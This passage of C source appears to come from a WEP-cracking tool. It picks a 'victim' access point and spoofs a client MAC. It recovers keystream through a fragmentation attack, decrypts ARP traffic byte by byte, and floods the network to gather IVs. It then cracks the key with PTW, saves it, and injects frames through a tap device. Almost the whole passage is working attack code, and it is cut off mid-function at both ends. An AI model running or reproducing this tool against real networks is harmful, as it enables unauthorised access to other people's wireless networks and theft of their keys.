		printf("Wrote %d / %d\n", rd, dlen);
		exit(1);
	}
}

int is_arp(struct ieee80211_frame *wh, int len)
{       
        int arpsize = 8 + sizeof(struct arphdr) + 10*2;

        if (len == arpsize || len == 54)
                return 1;

        return 0;
}

void *get_sa(struct ieee80211_frame *wh)
{       
        if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
                return wh->i_addr3;
        else    
                return wh->i_addr2;
}

void *get_da(struct ieee80211_frame *wh)
{       
        if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
                return wh->i_addr1;
        else    
                return wh->i_addr3;
}

int known_clear(void *clear, struct ieee80211_frame *wh, int len)
{       
        unsigned char *ptr = clear;

        /* IP */
        if (!is_arp(wh, len)) {
                unsigned short iplen = htons(len - 8);
                            
//                printf("Assuming IP %d\n", len);
                            
                len = sizeof(S_LLC_SNAP_IP) - 1;
                memcpy(ptr, S_LLC_SNAP_IP, len);
                ptr += len;
#if 1                  
                len = 2;    
                memcpy(ptr, "\x45\x00", len);
                ptr += len;
                            
                memcpy(ptr, &iplen, len);
                ptr += len;
#endif
                len = ptr - ((unsigned char*)clear);
                return len;
        }
//        printf("Assuming ARP %d\n", len);

        /* arp */
        len = sizeof(S_LLC_SNAP_ARP) - 1;
        memcpy(ptr, S_LLC_SNAP_ARP, len);
        ptr += len;

        /* arp hdr */
        len = 6;
        memcpy(ptr, "\x00\x01\x08\x00\x06\x04", len);
        ptr += len;

        /* type of arp */
        len = 2;
        if (memcmp(get_da(wh), "\xff\xff\xff\xff\xff\xff", 6) == 0)
                memcpy(ptr, "\x00\x01", len);
        else   
                memcpy(ptr, "\x00\x02", len);
        ptr += len;

        /* src mac */
        len = 6;
        memcpy(ptr, get_sa(wh), len);
        ptr += len;

        len = ptr - ((unsigned char*)clear);
        return len;
}

void add_keystream(struct ieee80211_frame* wh, int rd)
{
	unsigned char clear[1024];
	int dlen = rd - sizeof(struct ieee80211_frame) - 4 - 4;
	int clearsize;
	unsigned char *body = (unsigned char*) (wh+1);
	int i;
	
	clearsize = known_clear(clear, wh, dlen);
	if (clearsize < 16)
		return;

	for (i = 0; i < 16; i++)
		clear[i] ^= body[4+i];

	PTW_addsession(ptw, body, clear);
}

void got_wep(struct ieee80211_frame* wh, int rd) {
	int bodylen;
	int dlen;
	unsigned char clear[1024];
	int clearsize;
	unsigned char *body;

	bodylen = rd - sizeof(struct ieee80211_frame);

	dlen = bodylen - 4 - 4;
	body = (unsigned char*) wh + sizeof(*wh);


	// log it if its stuff not from us...
	if ( (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) ||
	     ( (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) &&
	        memcmp(wh->i_addr2, mymac, 6) != 0) ) {

		if (body[3] != 0) {
			time_print("Key index=%x!!\n", body[3]);
			exit(1);
		}
		log_wep(wh, rd);
		add_keystream(wh, rd);
	
		// try to decrypt too
		try_dictionary(wh, rd);
	}	
	
	// look for arp-request packets... so we can decrypt em
	if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
	    (memcmp(wh->i_addr3, mymac, 6) != 0) &&
	    (memcmp(wh->i_addr1, "\xff\xff\xff\xff\xff\xff", 6) == 0) &&
	     (dlen == 36 || dlen == PADDED_ARPLEN) &&
	    !decryptstate.cipher && 
	    !netip) {
		decrypt_arpreq(wh, rd);
	}

	// we have prga... check if its our stuff being relayed...
	if (prgainfo.len != 0) {
		// looks like it...
		if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
		    (memcmp(wh->i_addr3, mymac, 6) == 0) &&
		    (memcmp(wh->i_addr1, "\xff\xff\xff\xff\xff\xff", 6) == 0) &&
		    dlen == fragstate.len) {
	
//			printf("I fink AP relayed it...\n");
			set_prga(body, &body[4], fragstate.data, dlen);
			free(fragstate.data);
			fragstate.data = 0;
			fragstate.waiting_relay = 0;
		}   
		
		// see if we get the multicast stuff of when decrypting
		if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
		    (memcmp(wh->i_addr3, mymac, 6) == 0) &&
		    (memcmp(wh->i_addr1, MCAST_PREF, 5) == 0) &&
		    dlen == 36) {
	
			unsigned char pr = wh->i_addr1[5];

			printf("\n");
			time_print("Got clear-text byte: %d\n", 
			decryptstate.cipher[decryptstate.prgainfo.len-1] ^ pr);

			decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1] = pr;
			decryptstate.prgainfo.len++;
			decryptstate.fragstate.waiting_relay = 1;

			// ok we got the ip...
			if (decryptstate.prgainfo.len == 26+1) {
				unsigned char ip[4];
				int i;
				struct in_addr *in = (struct in_addr*) ip;
				unsigned char *ptr;

				for (i = 0; i < 4; i++)
					ip[i] = decryptstate.cipher[8+8+6+i] ^
						decryptstate.prgainfo.prga[8+8+6+i];

				assert(!netip);
				netip = (unsigned char*) malloc(16);
				if(!netip) {
					perror("malloc()");
					exit(1);
				}

				memset(netip, 0, 16);
				strcpy(netip, inet_ntoa(*in));

				time_print("Got IP=(%s)\n", netip);
				strcpy(myip, netip);

				ptr = strchr(myip, '.');
				assert(ptr);
				ptr = strchr(ptr+1, '.');
				assert(ptr);
				ptr = strchr(ptr+1, '.');
				assert(ptr);
				strcpy(ptr+1,"123");

				time_print("My IP=(%s)\n", myip);


				free(decryptstate.prgainfo.prga);
				free(decryptstate.cipher);
				memset(&decryptstate, 0, sizeof(decryptstate));
			}	
		}    
		return;
	}

	clearsize = known_clear(clear, wh, dlen);
	time_print("Datalen %d Known clear %d\n", dlen, clearsize);

	set_prga(body, &body[4], clear, clearsize);
}

void stuff_for_net(struct ieee80211_frame* wh, int rd) {
	int type,stype;
	
	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	if (type == IEEE80211_FC0_TYPE_DATA && 
	    stype == IEEE80211_FC0_SUBTYPE_DATA) {
		int dlen = rd - sizeof(struct ieee80211_frame);

		if (state == SPOOF_MAC) {
			unsigned char mac[6];
			if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) {
				memcpy(mac, wh->i_addr3, 6);
			} else if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) {
				memcpy(mac, wh->i_addr1, 6);
			} else assert(0);

			if (mac[0] == 0xff || mac[0] == 0x1)
				return;

			memcpy(mymac, mac, 6);	
			time_print("Trying to use MAC=(%s)\n", mac2str(mymac));
			state = FOUND_VICTIM;
			return;
		}

		// wep data!
		if ( (wh->i_fc[1] & IEEE80211_FC1_PROTECTED) &&
		    dlen > (4+8+4)) {
			got_wep(wh, rd);
		}
	}
}

void anal(unsigned char* buf, int rd, int tx) { // yze
	struct ieee80211_frame* wh = (struct ieee80211_frame *) buf;
	int type,stype;
	static int lastseq = -1;
	int seq;
	unsigned short *seqptr;
	int for_us = 0;

	if (rd < 1) {
		time_print("rd=%d\n", rd);
		exit(1);
	}

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	// sort out acks
	if (state >= FOUND_VICTIM) {
		// stuff for us
		if (memcmp(wh->i_addr1, mymac, 6) == 0) {
			for_us = 1;
			if (type != IEEE80211_FC0_TYPE_CTL)
				send_ack(tx);
		}
	}	
	
	// XXX i know it aint great...
	seqptr = (unsigned short*)  wh->i_seq;
	seq = (*seqptr & IEEE80211_SEQ_SEQ_MASK) >> IEEE80211_SEQ_SEQ_SHIFT;
	if (seq == lastseq && (wh->i_fc[1] & IEEE80211_FC1_RETRY) &&
	    type != IEEE80211_FC0_TYPE_CTL) {
//		printf("Ignoring dup packet... seq=%d\n", seq);
		return;
	}
	lastseq = seq;

	// management frame
	if (type == IEEE80211_FC0_TYPE_MGT) {
		if(state == FIND_VICTIM) {
			if (stype == IEEE80211_FC0_SUBTYPE_BEACON ||
			    stype == IEEE80211_FC0_SUBTYPE_PROBE_RESP) {

			    	if (get_victim_ssid(wh, rd)) {
			    		return;
				}
			}
			    
		}
	}

	if (state >= FOUND_VICTIM) {
		// stuff for us
		if (for_us) {
			stuff_for_us(wh, rd);
		}

		// stuff in network [even for us]
		if ( ((wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) &&
			  (memcmp(victim.bss, wh->i_addr1, 6) == 0)) || 
			  
			  ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
			  (memcmp(victim.bss, wh->i_addr2, 6) == 0))
			   ) {
			stuff_for_net(wh, rd);
		}
	}
}

void do_arp(unsigned char* buf, unsigned short op,
	    unsigned char* m1, unsigned char* i1,
	    unsigned char* m2, unsigned char* i2) {

        struct in_addr sip;
        struct in_addr dip;
	struct arphdr* h;
	unsigned char* data;

        inet_aton(i1, &sip);
        inet_aton(i2, &dip);
	h = (struct arphdr*) buf;

	memset(h, 0, sizeof(*h));

	h->ar_hrd = htons(ARPHRD_ETHER);
        h->ar_pro = htons(ETHERTYPE_IP);
        h->ar_hln = 6;
        h->ar_pln = 4;
        h->ar_op = htons(op);

	data = (unsigned char*) h + sizeof(*h);

	memcpy(data, m1, 6);
	data += 6;
	memcpy(data, &sip, 4);
	data += 4;

	memcpy(data, m2, 6);
	data += 6;
	memcpy(data, &dip, 4);
	data += 4;
}

void send_fragment(int tx, struct frag_state* fs, struct prga_info *pi) {
	unsigned char buf[4096];
	struct ieee80211_frame* wh;
	unsigned char* body;
	int fragsize;
	uLong crc;
	unsigned long *pcrc;
	int i;
	unsigned short* seq;
	unsigned short sn, fn;

	wh = (struct ieee80211_frame*) buf;
	memcpy(wh, &fs->wh, sizeof(*wh));

	body = (unsigned char*) wh + sizeof(*wh);
	memcpy(body, &pi->iv, 3);
	body += 3;
	*body++ = 0; // key index

	fragsize = fs->data + fs->len - fs->ptr;

	assert(fragsize > 0);
	
	if ( (fragsize + 4) > pi->len) {
		fragsize = pi->len  - 4;
		wh->i_fc[1] |= IEEE80211_FC1_MORE_FRAG;
	} 
	// last fragment
	else {
		wh->i_fc[1] &= ~IEEE80211_FC1_MORE_FRAG;
	}

	memcpy(body, fs->ptr, fragsize);

	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, body, fragsize);
	pcrc = (unsigned long*) (body+fragsize);
	*pcrc = crc;

	for (i = 0; i < (fragsize + 4); i++)
		body[i] ^= pi->prga[i];

	seq = (unsigned short*) &wh->i_seq;
	sn = (*seq & IEEE80211_SEQ_SEQ_MASK) >> IEEE80211_SEQ_SEQ_SHIFT;
	fn = *seq & IEEE80211_SEQ_FRAG_MASK;
//	printf ("Sent frag (data=%d) (seq=%d fn=%d)\n", fragsize, sn, fn);
	       
	send_frame(tx, buf, sizeof(*wh) + 4 + fragsize+4);

	seq = (unsigned short*) &fs->wh.i_seq;
	*seq = fnseq(++fn, sn);
	fs->ptr += fragsize;

	if (fs->ptr - fs->data == fs->len) {
//		printf("Finished sending frags...\n");
		fs->waiting_relay = 1;
	}
}

void prepare_fragstate(struct frag_state* fs, int pad) {
	fs->waiting_relay = 0;
	fs->len = 8 + 8 + 20 + pad;
	fs->data = (unsigned char*) malloc(fs->len);

	if(!fs->data) {
		perror("malloc()");
		exit(1);
	}

	fs->ptr = fs->data;

	do_llc(fs->data, ETHERTYPE_ARP);
	do_arp(&fs->data[8], ARPOP_REQUEST,
	       mymac, myip, 
	       "\x00\x00\x00\x00\x00\x00", "192.168.0.1");

	memset(&fs->wh, 0, sizeof(fs->wh));
	fill_basic(&fs->wh);

	memset(fs->wh.i_addr3, 0xff, 6);
	fs->wh.i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	fs->wh.i_fc[1] |= IEEE80211_FC1_DIR_TODS |
				IEEE80211_FC1_MORE_FRAG |
				IEEE80211_FC1_PROTECTED;

	memset(&fs->data[8+8+20], 0, pad);
}

void discover_prga(int tx) {

	// create packet...
	if (!fragstate.data) {
		int pad = 0;

		if (prgainfo.len >= 20)
			pad = prgainfo.len*3;
	
		prepare_fragstate(&fragstate, pad);
	}

	if (!fragstate.waiting_relay) {
		send_fragment(tx, &fragstate, &prgainfo);
		if (fragstate.waiting_relay) {
			if (gettimeofday(&fragstate.last, NULL) == -1)
				err(1, "gettimeofday()");
		}
	}	
}

void decrypt(int tx) {

	// gotta initiate
	if (!decryptstate.fragstate.data) {
		prepare_fragstate(&decryptstate.fragstate, 0);

		memcpy(decryptstate.fragstate.wh.i_addr3,
		       MCAST_PREF, 5);

		decryptstate.fragstate.wh.i_addr3[5] =
		decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1];

		decryptstate.prgainfo.len++;
	}

	// guess diff prga byte...
	if (decryptstate.fragstate.waiting_relay) {	
		unsigned short* seq;
		decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1]++;

#if 0		
		if (decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1] == 0) {
			printf("Can't decrpyt!\n");
			exit(1);
		}
#endif
		decryptstate.fragstate.wh.i_addr3[5] =
		decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1];

		decryptstate.fragstate.waiting_relay = 0;
		decryptstate.fragstate.ptr = decryptstate.fragstate.data;

		seq = (unsigned short*) &decryptstate.fragstate.wh.i_seq;
		*seq = fnseq(0, txstate.psent);
	}

	send_fragment(tx, &decryptstate.fragstate,
		      &decryptstate.prgainfo);
}

void flood_inet(tx) {
	static int send_arp = -1;
	static unsigned char arp_pkt[128];
	static int arp_len;
	static unsigned char udp_pkt[128];
	static int udp_len;
	static struct timeval last_ip;

	// need to init packets...
	if (send_arp == -1) {
		unsigned char* body;
		unsigned char* ptr;
		struct ieee80211_frame* wh;
		struct ip* ih;
		struct udphdr* uh;

		memset(arp_pkt, 0, sizeof(arp_pkt));
		memset(udp_pkt, 0, sizeof(udp_pkt));

		// construct ARP
		wh = (struct ieee80211_frame*) arp_pkt;
		fill_basic(wh);

		wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
		wh->i_fc[1] |= IEEE80211_FC1_PROTECTED | IEEE80211_FC1_DIR_TODS;
		memset(wh->i_addr3, 0xff, 6);

		body = (unsigned char*) wh + sizeof(*wh);
		ptr = body;
		ptr += 4; // iv

		do_llc(ptr, ETHERTYPE_ARP);
		ptr += 8;
		do_arp(ptr, ARPOP_REQUEST, mymac, myip,
		       "\x00\x00\x00\x00\x00\x00", netip);

		wepify(body, 8+8+20);
		arp_len = sizeof(*wh) + 4 + 8 + 8 + 20 + 4;
		assert(arp_len < sizeof(arp_pkt));


		// construct UDP
		wh = (struct ieee80211_frame*) udp_pkt;
		fill_basic(wh);
		
		wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
		wh->i_fc[1] |= IEEE80211_FC1_PROTECTED | IEEE80211_FC1_DIR_TODS;
		memcpy(wh->i_addr3, rtrmac, 6);

		body = (unsigned char*) wh + sizeof(*wh);
		ptr = body;
		ptr += 4; // iv

		do_llc(ptr, ETHERTYPE_IP);
		ptr += 8;

		ih = (struct ip*) ptr;
		ih->ip_hl = 5;
		ih->ip_v = 4;
		ih->ip_tos = 0;
		ih->ip_len = htons(20+8+5);
		ih->ip_id = htons(666);
		ih->ip_off = 0;
		ih->ip_ttl = 128;
		ih->ip_p = IPPROTO_UDP;
		ih->ip_sum = 0;

		inet_aton(myip, &ih->ip_src);
		inet_aton(floodip, &ih->ip_dst);

		ih->ip_sum = in_cksum((unsigned short*)ih, 20);

		ptr += 20;
		uh = (struct udphdr*) ptr;
		uh->uh_sport = htons(floodsport);
		uh->uh_dport = htons(floodport);
		uh->uh_ulen = htons(8+5);
		uh->uh_sum = 0;

		ptr += 8;
		strcpy(ptr, "sorbo");

		uh->uh_sum = udp_checksum(ptr - 8, 8+5, &ih->ip_src,
					  &ih->ip_dst);

		wepify(body, 8+20+8+5);
		udp_len = sizeof(*wh) + 4 + 8 + 20 + 8 + 5 + 4;
		assert(udp_len < sizeof(udp_pkt));

		// bootstrap
		send_arp = 1;

		memset(&last_ip, 0, sizeof(last_ip));
	}

	if (send_arp == 1) {
		struct timeval now;
		unsigned long sec;

		if (gettimeofday(&now, NULL) == -1) {
			perror("gettimeofday()");
			exit(1);
		}

		sec = now.tv_sec - last_ip.tv_sec;

		if (sec < 5)
			return;

		send_frame(tx, arp_pkt, arp_len);
		send_arp = 0;
	}

	else if (send_arp == 0) {
		if (gettimeofday(&last_ip, NULL) == -1) {
			perror("gettimeofday()");
			exit(1);
		}
		
		send_frame(tx, udp_pkt, udp_len);
		send_arp = 1;
	} else assert(0);
}

void send_arp(int tx, unsigned short op, unsigned char* srcip, 
	      unsigned char* srcmac, unsigned char* dstip, 
	      unsigned char* dstmac) {
	
	static unsigned char arp_pkt[128];
	unsigned char* body;
	unsigned char* ptr;
	struct ieee80211_frame* wh;
	int arp_len;

	memset(arp_pkt, 0, sizeof(arp_pkt));

	// construct ARP
	wh = (struct ieee80211_frame*) arp_pkt;
	fill_basic(wh);

	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_PROTECTED | IEEE80211_FC1_DIR_TODS;
	memset(wh->i_addr3, 0xff, 6);

	body = (unsigned char*) wh + sizeof(*wh);
	ptr = body;
	ptr += 4; // iv

	do_llc(ptr, ETHERTYPE_ARP);
	ptr += 8;
	do_arp(ptr, op, srcmac, srcip, dstmac, dstip);

	wepify(body, 8+8+20);
	arp_len = sizeof(*wh) + 4 + 8 + 8 + 20 + 4;
	assert(arp_len < sizeof(arp_pkt));

	send_frame(tx, arp_pkt, arp_len);
}	      

void can_write(int tx) {
	static char arp_ip[16];

	switch (state) {
		case FOUND_VICTIM:
			send_auth(tx);
			state = SENDING_AUTH;
			break;

		case GOT_AUTH:
			send_assoc(tx);
			state = SENDING_ASSOC;
			break;

		case GOT_ASSOC:
			if (prgainfo.prga && prgainfo.len < min_prga) {
				discover_prga(tx);
				break;
			}
			
			if (decryptstate.cipher) {
				decrypt(tx);
				break;
			}
			
			if (!prgainfo.prga)
				break;

			if (taptx_len) {
				send_frame(tx, taptx, taptx_len);
				taptx_len = 0;
				break;
			}	

			// try to find rtr mac addr
			if (netip && !rtrmac) {
				char* ptr;

				strcpy(arp_ip, netip);
				if (!netip_arg) {
					ptr = strchr(arp_ip, '.');
					assert(ptr);
					ptr = strchr(++ptr, '.');
					assert(ptr);
					ptr = strchr(++ptr, '.');
					assert(ptr);
					strcpy(++ptr, "1");
				}

				if (gettimeofday(&arpsend, NULL) == -1)
					err(1, "gettimeofday()");

				time_print("Sending arp request for: %s\n", arp_ip);
				send_arp(tx, ARPOP_REQUEST, myip, mymac,
					 arp_ip, "\x00\x00\x00\x00\x00\x00");
			
				// XXX lame
				rtrmac = (unsigned char*)1;
				break;	 
			}
	
			// need to generate traffic...
			if (rtrmac > (unsigned char*)1 && netip) {
				if (floodip)
					flood_inet(tx);
				else {
					// XXX lame technique... anyway... im
					// only interested in flood_inet...

					// could ping broadcast....
					send_arp(tx, ARPOP_REQUEST, myip, mymac,
						 arp_ip, "\x00\x00\x00\x00\x00\x00");
				}

				break;
			}

			break;	
	}
}

void save_key(unsigned char *key, int len)
{
	char tmp[16];
	char k[64];
	int fd;
	int rd;

	assert(len*3 < sizeof(k));

	k[0] = 0;
	while (len--) {
		sprintf(tmp, "%.2X", *key++);
		strcat(k, tmp);
		if (len)
			strcat(k, ":");
	}

	fd = open(KEY_FILE, O_WRONLY | O_CREAT, 0644);
	if (fd == -1)
		err(1, "open()");

	printf("\nKey: %s\n", k);
	rd = write(fd, k, strlen(k));
	if (rd == -1)
		err(1, "write()");
	if (rd != strlen(k))
		errx(1, "write %d/%d\n", rd, strlen(k));
	close(fd);
}

#define KEYLIMIT (1000000)
int do_crack(void)
{
	unsigned char key[PTW_KEYHSBYTES];

	if(PTW_computeKey(ptw, key, 13, KEYLIMIT) == 1) {
		save_key(key, 13);
		return 1;
	}
	if(PTW_computeKey(ptw, key, 5, KEYLIMIT/10) == 1) {
		save_key(key, 5);
		return 1;
	}

	return 0;
}

void try_crack() {
	if (crack_pid) {
		printf("\n");
		time_print("Warning... previous crack still running!\n");
		kill_crack();
	}	

	if (weplog.fd) {
		if (fsync(weplog.fd) == -1)
			err(1, "fsync");
	}

	crack_pid = fork();

	if (crack_pid == -1)
		err(1, "fork");

	// child
	if (crack_pid == 0) {
		if (!do_crack())
			printf("\nCrack unsuccessful\n");
		exit(1);
	} 

	// parent
	printf("\n");
	time_print("Starting crack PID=%d\n", crack_pid);
	if (gettimeofday(&crack_start, NULL) == -1)
		err(1, "gettimeofday");

	
	wep_thresh += thresh_incr;
}

void open_tap() {
	struct stat st;
	int s;
	struct ifreq ifr;
	unsigned int flags;
	
	tapfd = open(TAP_DEV, O_RDWR);
	if (tapfd == -1) {
		printf("Can't open tap: %s\n", strerror(errno));
		exit(1);
	}
	if(fstat(tapfd, &st) == -1) {
		perror("fstat()");
		exit(1);
	}

	// feer
	strcpy(tapdev, devname(st.st_rdev, S_IFCHR));

	s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("socket()");
		exit(1);
	}
	
	// MTU
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, tapdev);
	ifr.ifr_mtu = 1500;
	if (ioctl(s, SIOCSIFMTU, &ifr) == -1) {
		perror("ioctl(SIOCSIFMTU)");
		exit(1);
	}

	// set iface up
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, tapdev);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) == -1) {
		perror("ioctl(SIOCGIFFLAGS)");
		exit(1);
	}

	flags = (ifr.ifr_flags & 0xffff) | (ifr.ifr_flagshigh << 16);
	flags |= IFF_UP;
	
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, tapdev);
	ifr.ifr_flags = flags & 0xffff;
	ifr.ifr_flagshigh = flags >> 16;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) == -1) {
		perror("ioctl(SIOCSIFFLAGS)");
		exit(1);
	}

	close(s);
	time_print("Opened tap device: %s\n", tapdev);
}

void read_tap() {
	unsigned char buf[4096];
	struct ether_header* eh;
	struct ieee80211_frame* wh;
	int rd;
	unsigned char* ptr, *body;
	int dlen;

	rd = read(tapfd, buf, sizeof(buf));
	if (rd == -1) {
		perror("read()");
		exit(1);
	}
	dlen = rd - sizeof(*eh);

	assert(dlen > 0);

	if (dlen+8 > prgainfo.len) {
		printf("\n");
		// XXX lame message...
		time_print("Sorry... want to send %d but only got %d prga\n",
			   dlen, prgainfo.len);
		return;	   

	}

	if (taptx_len) {
		printf("\n");
		time_print("Sorry... overflow in TAP queue [of 1 packet =P] overwriting\n");
		// XXX could not read instead and get rid of it in select...
	}

	assert (rd < (sizeof(buf)-sizeof(*wh) - 8 - 8));

	eh = (struct ether_header*) buf;

	wh = (struct ieee80211_frame*) taptx;
	memset(wh, 0, sizeof(*wh));
	fill_basic(wh);

        wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
        wh->i_fc[1] |= IEEE80211_FC1_PROTECTED | IEEE80211_FC1_DIR_TODS;

	memcpy(wh->i_addr2, eh->ether_shost, 6);
	memcpy(wh->i_addr3, eh->ether_dhost, 6);

        body = (unsigned char*) wh + sizeof(*wh);
        ptr = body;
        ptr += 4; // iv

	do_llc(ptr, ntohs(eh->ether_type));
	ptr += 8;

	memcpy(ptr, &buf[sizeof(*eh)], dlen);

	wepify(body, 8+dlen); 
	taptx_len = sizeof(*wh) + 4 + 8 + dlen + 4;

	assert (taptx_len < sizeof(taptx));
}

int elapsedd(struct timeval *past, struct timeval *now)
{
        int el;
 
        el = now->tv_sec - past->tv_sec;
        assert(el >= 0);
        if (el == 0) {
                el = now->tv_usec - past->tv_usec;
        } else {
                el = (el - 1)*1000*1000; 
                el += 1000*1000-past->tv_usec;
                el += now->tv_usec;
        }
        
        return el;
}       

static unsigned char *get_80211(unsigned char **data, int *totlen, int *plen)
{             
#define BIT(n)  (1<<(n))
        struct bpf_hdr *bpfh;
        struct ieee80211_radiotap_header *rth;
        uint32_t present;
        uint8_t rflags;
        void *ptr;
	static int nocrc = 0;
        
	assert(*totlen);
           
        /* bpf hdr */
        bpfh = (struct bpf_hdr*) (*data);
        assert(bpfh->bh_caplen == bpfh->bh_datalen); /* XXX */
        *totlen -= bpfh->bh_hdrlen;
        
        /* check if more packets */
        if ((int)bpfh->bh_caplen < *totlen) {
                int tot = bpfh->bh_hdrlen + bpfh->bh_caplen;
                int offset = BPF_WORDALIGN(tot);
                
                *data = (char*)bpfh + offset;
                *totlen -= offset - tot; /* take into account align bytes */
        } else if ((int)bpfh->bh_caplen > *totlen)
                abort();

        *plen = bpfh->bh_caplen;
        *totlen -= bpfh->bh_caplen;
        assert(*totlen >= 0);

        /* radiotap */
        rth = (struct ieee80211_radiotap_header*)
              ((char*)bpfh + bpfh->bh_hdrlen);
        /* XXX cache; drivers won't change this per-packet */
        /* check if FCS/CRC is included in packet */
        present = le32toh(rth->it_present);
        if (present & BIT(IEEE80211_RADIOTAP_FLAGS)) {
                if (present & BIT(IEEE80211_RADIOTAP_TSFT))
                        rflags = ((const uint8_t *)rth)[8];
                else    
                        rflags = ((const uint8_t *)rth)[0];
        } else  
                rflags = 0;
        *plen -= rth->it_len;
        assert(*plen > 0);

        /* 802.11 CRC */
        if (nocrc || (rflags & IEEE80211_RADIOTAP_F_FCS)) {
                *plen -= IEEE80211_CRC_LEN;
                nocrc = 1;
        }
        
        ptr = (char*)rth + rth->it_len;

        return ptr;
#undef BIT
}

static int read_packet(int fd, unsigned char *dst, int len)
{
	static unsigned char buf[4096];
	static int totlen = 0;
	static unsigned char *next = buf;
        unsigned char *pkt;
        int plen;
        
        assert(len > 0);

        /* need to read more */
        if (totlen == 0) {
                totlen = read(fd, buf, sizeof(buf));
                if (totlen == -1) {
                        totlen = 0;
                        return -1;
                }
                next = buf;
        }
        
        /* read 802.11 packet */
        pkt = get_80211(&next, &totlen, &plen);
        if (plen > len)
                plen = len;
        assert(plen > 0);
        memcpy(dst, pkt, plen);

        return plen;
}

void own(int wifd) {
	unsigned char buf[4096];
	int rd;
	fd_set rfd;
	struct timeval tv;
	char *pbar = "/-\\|";
	char *pbarp = &pbar[0];
	struct timeval lasthop;
	struct timeval now;
	unsigned int last_wep_count = 0;
	struct timeval last_wcount;
	struct timeval last_status;
	int fd;
	int largest;

	weplog.fd = open(WEP_FILE, O_WRONLY | O_APPEND);
	if (weplog.fd == -1) {
		struct pcap_file_header pfh;

		memset(&pfh, 0, sizeof(pfh));
		pfh.magic           = TCPDUMP_MAGIC;
		pfh.version_major   = PCAP_VERSION_MAJOR;
		pfh.version_minor   = PCAP_VERSION_MINOR;
		pfh.thiszone        = 0;
		pfh.sigfigs         = 0;
		pfh.snaplen         = 65535;
		pfh.linktype        = LINKTYPE_IEEE802_11;
		
		weplog.fd = open(WEP_FILE, O_WRONLY | O_CREAT,
				 S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
		if (weplog.fd != -1) {
			if (write(weplog.fd, &pfh, sizeof(pfh)) != sizeof(pfh))
				err(1, "write()");
		}
	}
	else {
		time_print("WARNING: Appending in %s\n", WEP_FILE);
	}

	if (weplog.fd == -1) {
		perror("open()");
		exit(1);
	}

	fd = open(PRGA_FILE, O_RDONLY);
	if (fd != -1) {
		time_print("WARNING: reading prga from %s\n", PRGA_FILE);
		rd = read(fd, buf, sizeof(buf));
		if (rd == -1) {
			perror("read()");
			exit(1);
		}
		if (rd >= 8) {
			set_prga(buf, NULL, &buf[3], rd - 3);
		}

		close(fd);
	}

	fd = open(DICT_PATH, O_RDONLY);
	if (fd == -1) {
		time_print("Creating dictionary directory (%s)\n", DICT_PATH);
		if (mkdir (DICT_PATH, 0755) == -1) {
			perror("mkdir()");
			exit(1);
		}
	}
	else
		close(fd);

	open_tap();
	set_if_mac(mymac, tapdev);
	time_print("Set tap MAC to: %s\n", mac2str(mymac));

	if (tapfd > wifd)
		largest = tapfd;
	else
		largest = wifd;

	if (signal(SIGINT, &cleanup) == SIG_ERR) {
		perror("signal()");
		exit(1);
	}
	if (signal (SIGTERM, &cleanup) == SIG_ERR) {
		perror("signal()");
		exit(1);
	}

	time_print("Looking for a victim...\n");
	if (gettimeofday(&lasthop, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

	memcpy(&last_wcount, &lasthop, sizeof(last_wcount));
	memcpy(&last_status, &lasthop, sizeof(last_status));

	while (1) {
		if (gettimeofday(&now, NULL) == -1) {
			perror("gettimeofday()");
			exit(1);
		}

		/* check for relay timeout */
		if (fragstate.waiting_relay) {
			int el;

			el = now.tv_sec - fragstate.last.tv_sec;
			assert (el >= 0);
			if (el == 0) {
				el = now.tv_usec - fragstate.last.tv_usec;
			} else {
				el--;

				el *= 1000*1000;
				el += 1000*1000 - fragstate.last.tv_usec;
				el += now.tv_usec;

				if (el > (1500*1000)) {
//					printf("\nLAMER timeout\n\n");
					free(fragstate.data);
					fragstate.data = 0;
				}
			}
		}

		/* check for arp timeout */
		if (rtrmac == (unsigned char*) 1) {
			int el;

			el = elapsedd(&arpsend, &now);
			if (el >= (1500*1000)) {
				rtrmac = 0;
			}
		}
		
		// status bar
		if ( (now.tv_sec > last_status.tv_sec ) ||
		     ( now.tv_usec - last_status.tv_usec > 100*1000)) {
		     	if (crack_pid && (now.tv_sec > last_status.tv_sec)) {
				check_key();
			}
			if (netip && prgainfo.len >= min_prga && 
			    rtrmac > (unsigned char*) 1) {
				time_print("WEP=%.9d (next crack at %d) IV=%.2x:%.2x:%.2x (rate=%d)         \r", 
				       weplog.packets, wep_thresh, 
				       weplog.iv[0], weplog.iv[1], weplog.iv[2],
				       weplog.rate);
				fflush(stdout);
			}
			else {
